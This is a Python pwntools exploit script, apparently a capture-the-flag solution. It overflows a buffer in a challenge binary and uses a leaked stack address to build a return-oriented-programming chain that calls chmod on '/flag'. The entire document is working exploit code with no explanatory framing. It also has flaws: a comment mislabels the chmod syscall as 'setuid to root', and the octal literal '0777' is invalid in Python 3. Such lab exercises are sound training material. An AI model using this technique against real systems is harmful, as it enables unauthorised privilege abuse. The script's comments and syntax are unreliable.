from pwn import * 


GOAL=b'/flag\x00'
BUFFER_LEN=0x58


def get_payload(args, proc: process):
    payload = GOAL
    payload += cyclic(BUFFER_LEN - len(GOAL))

    proc.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
    leak_stack_addr = int(proc.recvline(drop=True)[:-1],16)
    print(f"Leaked addr: {leak_stack_addr}")

    # setuid to root syscall
    payload += p64(0x401a70)
    payload += p64(0x5A)
    payload += p64(0x401a88)
    payload += p64(leak_stack_addr)
    payload += p64(0x401a90)
    payload += p64(0777)

    payload += p64(0x401a68)

    return payload


def main():
    proc = process("/challenge/stop-pop-and-rop-easy")
    proc.send(get_payload(None, proc))


if __name__ == '__main__':
    main()
